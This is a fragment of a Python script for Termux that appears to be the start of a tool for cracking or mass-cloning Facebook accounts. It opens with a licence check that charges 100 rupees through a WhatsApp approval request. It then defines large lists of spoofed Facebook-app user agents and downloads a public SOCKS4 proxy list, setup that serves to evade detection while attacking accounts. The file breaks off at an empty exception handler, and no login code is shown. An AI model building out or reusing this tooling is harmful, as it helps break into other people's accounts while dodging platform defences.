def main_apv():

    imt="110Y=="

    ak="TUNAN_100RS"

    os.system('clear')

    print(logo)

    try:

        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
        print ("༄•───────────────────────────────────────•༄")
        print ("YOUR TOKEN IS NOT APROVAL")     
        print ("         THIS IS YOUR TOKEN👇📥📬")
        print ("༄•───────────────────────────────────────•༄")
        print ("")
        myid=uuid.uuid4().hex[:10].upper()
        print ("          YOUR KEY : "+ak+myid+imt)
        print ("༄•───────────────────────────────────────•༄")
        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
        print ("")
        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")
        print ("༄•───────────────────────────────────────•༄")
        time.sleep(3.5)
        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt

        os.system('am start https://wa.me/+8801887074682?text=' + tks)

        

    r1=requests.get("https://github.com/ITS-TUNAN/Test1/blob/main/Aprove.txt").text

    if key1 in r1:

        R()

    else:

        os.system("clear")

        print(logo)

        print ("         ༄•───────────────────────────────────────•༄")
        print ("             \33[1;94mGIVE ME 100RS FOR APROVAL RIFAT")     
           
        print ("             \33[1;32mYOUR KEY : "+ak+key1)     
        print ("             Key And Sent Me WP Approvel Your Key ")
        print ("         ༄•───────────────────────────────────────•༄")

        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1

        os.system('am start https://wa.me/+8801887074682?text=' + tks)
#-----------------[ IMPORT-MODULE ]-------------------
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()
Q="\x1b[00m"
I='\033[1;32m'
dt = f"{Q}[{I}•{Q}]"
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
noob = ['Mozilla/5.0 (Linux; Android 11; itel A509W Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/345.0.0.8.69;]', 'Mozilla/5.0 (Linux; Android 8.1.0; Hisense F27 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/345.0.0.8.69;]', 'Mozilla/5.0 (Linux; Android 6.0; VFD 1100 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/74.0.0.6.186;]', 'Mozilla/5.0 (Linux; Android 11; itel A509W Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/345.0.0.8.69;]', 'Mozilla/5.0 (Linux; Android 8.1.0; Hisense F27 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/345.0.0.8.69;]', 'Mozilla/5.0 (Linux; Android 6.0; VFD 1100 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/74.0.0.6.186;]','Mozilla/5.0 (Linux; Android 9; PEAQ PET 100 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 12; BV5200 Pro Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 6.0.1; VFD 1400 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 8.1.0; ASUS_A009 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 12; V2006 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.67 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 6.0.1; VFD 1400 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]','Mozilla/5.0 (Linux; Android 12; TECNO LG7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 12; RMO-NX1 Build/HONORRMO-N21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.0.6;]','Mozilla/5.0 (Linux; Android 11; itel A509W Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/345.0.0.8.69;]','Mozilla/5.0 (Linux; Android 10; ALIGATOR S6500 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 12; 22111317I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Ulefone_S1 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 13; SM-G736U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]','Mozilla/5.0 (Linux; Android 10; TPC-G1010 Build/QP1A.190711.020.C3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]','Mozilla/5.0 (Linux; Android 12; 22111317I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; I2208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; CPH1945) AppleWebKit/537.36 (KHTML, like Gecko) JioPages/4.0.1 Chrome/101.0.4951.41 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 10; zh-cn; ELE-AL00 Build/HUAWEIELE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.102 MQQBrowser/13.7 Mobile Safari/537.36 COVC/046405','Mozilla/5.0 (Linux; Android 12; V2148A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/14.0.0.0','Mozilla/5.0 (Linux; Android 13; 22041211AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; AE9010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.0.2; PSP3531DUO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Lenovo L78051) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 11; zh-tw; Mi 10 Lite Zoom Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.9.2-gn','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.12 Safari/537.36 (Chromium GOST)','Mozilla/5.0 (Linux; U; Android 10; en-gb; DRA-LX9 Build/HUAWEIDRA-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 PHX/12.2','Mozilla/5.0 (Linux; Android 10; Symphony Z32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; RMX3142) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; V2217 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; HarmonyOS; ASK-AL00x; HMSCore 6.9.0.302; GMSCore 14.3.67) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; V1986A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/13.9.0.5','Mozilla/5.0 (Linux; Android 8.1.0; Lenovo L78011 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 Mb2345Browser/14.2.1','Mozilla/5.0 (Linux; Android 9; TECNO KC6; Flow) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/366.0.0.303 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 11; en-US; ZTE A2121 Build/RKQ1.210303.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36','Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edge/40.15254.603','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.1','Mozilla/5.0 (Windows Phone 8.0; Android 4.2.1; NOKIA; Lumia 640 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Mobile Safari/537.36 Edge/12.0','Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 Edge/40.15254.603','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/44.18363.8131','Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 Edge/40.15254.603','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19045','Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_50_03) AppleWebKit/534.09.62 (KHTML, like Gecko) Chrome/53.6.1114.7486 Safari/530.70 Edge/34.76657','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_35_82) AppleWebKit/531.76.23 (KHTML, like Gecko) Chrome/56.2.6475.1203 Safari/532.16 Edge/36.00250','Mozilla/5.0 (Linux; Android 12; 22111317I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; 22111317I Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 12; 22111317I Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]','Mozilla/5.0 (Linux; U; Android 13; Redmi Note 12 Build/RP1A.6500114.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36 OPR/25.0.2254.116653','Mozilla/5.0 (Linux; U; Android 13; Redmi Note 12 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36 OPR/25.0.2254.116653','Mozilla/5.0 (Linux; Android 12; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36 OPR/69.0.3606.64982','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/110.0.1587.69','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36']
noob2 = ['Mozilla/5.0 (Linux; Android 11; itel A509W Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/345.0.0.8.69;]', 'Mozilla/5.0 (Linux; Android 8.1.0; Hisense F27 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/345.0.0.8.69;]', 'Mozilla/5.0 (Linux; Android 6.0; VFD 1100 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/74.0.0.6.186;]', 'Mozilla/5.0 (Linux; Android 11; itel A509W Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/345.0.0.8.69;]', 'Mozilla/5.0 (Linux; Android 8.1.0; Hisense F27 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/345.0.0.8.69;]', 'Mozilla/5.0 (Linux; Android 6.0; VFD 1100 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/74.0.0.6.186;]','Mozilla/5.0 (Linux; Android 9; PEAQ PET 100 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 12; BV5200 Pro Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 6.0.1; VFD 1400 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 8.1.0; ASUS_A009 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 12; V2006 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.67 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 6.0.1; VFD 1400 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]','Mozilla/5.0 (Linux; Android 12; TECNO LG7n Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 12; RMO-NX1 Build/HONORRMO-N21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.0.6;]','Mozilla/5.0 (Linux; Android 11; itel A509W Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/345.0.0.8.69;]','Mozilla/5.0 (Linux; Android 10; ALIGATOR S6500 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 12; 22111317I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.1.0; Ulefone_S1 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 13; SM-G736U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]','Mozilla/5.0 (Linux; Android 10; TPC-G1010 Build/QP1A.190711.020.C3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]','Mozilla/5.0 (Linux; Android 12; 22111317I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; I2208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; CPH1945) AppleWebKit/537.36 (KHTML, like Gecko) JioPages/4.0.1 Chrome/101.0.4951.41 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 10; zh-cn; ELE-AL00 Build/HUAWEIELE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.102 MQQBrowser/13.7 Mobile Safari/537.36 COVC/046405','Mozilla/5.0 (Linux; Android 12; V2148A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/14.0.0.0','Mozilla/5.0 (Linux; Android 13; 22041211AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; AE9010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 5.0.2; PSP3531DUO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; Lenovo L78051) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 11; zh-tw; Mi 10 Lite Zoom Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.9.2-gn','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.12 Safari/537.36 (Chromium GOST)','Mozilla/5.0 (Linux; U; Android 10; en-gb; DRA-LX9 Build/HUAWEIDRA-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 PHX/12.2','Mozilla/5.0 (Linux; Android 10; Symphony Z32) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; RMX3142) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; V2217 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; HarmonyOS; ASK-AL00x; HMSCore 6.9.0.302; GMSCore 14.3.67) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; V1986A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/13.9.0.5','Mozilla/5.0 (Linux; Android 8.1.0; Lenovo L78011 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 Mb2345Browser/14.2.1','Mozilla/5.0 (Linux; Android 9; TECNO KC6; Flow) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/366.0.0.303 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 11; en-US; ZTE A2121 Build/RKQ1.210303.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.4.0.1306 Mobile Safari/537.36','Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edge/40.15254.603','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.1','Mozilla/5.0 (Windows Phone 8.0; Android 4.2.1; NOKIA; Lumia 640 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Mobile Safari/537.36 Edge/12.0','Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 Edge/40.15254.603','Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/44.18363.8131','Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36 Edge/40.15254.603','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19045','Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_50_03) AppleWebKit/534.09.62 (KHTML, like Gecko) Chrome/53.6.1114.7486 Safari/530.70 Edge/34.76657','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_35_82) AppleWebKit/531.76.23 (KHTML, like Gecko) Chrome/56.2.6475.1203 Safari/532.16 Edge/36.00250','Mozilla/5.0 (Linux; Android 12; 22111317I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; 22111317I Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Mozilla/5.0 (Linux; Android 12; 22111317I Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]','Mozilla/5.0 (Linux; U; Android 13; Redmi Note 12 Build/RP1A.6500114.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36 OPR/25.0.2254.116653','Mozilla/5.0 (Linux; U; Android 13; Redmi Note 12 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36 OPR/25.0.2254.116653','Mozilla/5.0 (Linux; Android 12; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36 OPR/69.0.3606.64982','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/110.0.1587.69','Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Vivaldi/5.7.2921.63','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36']
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
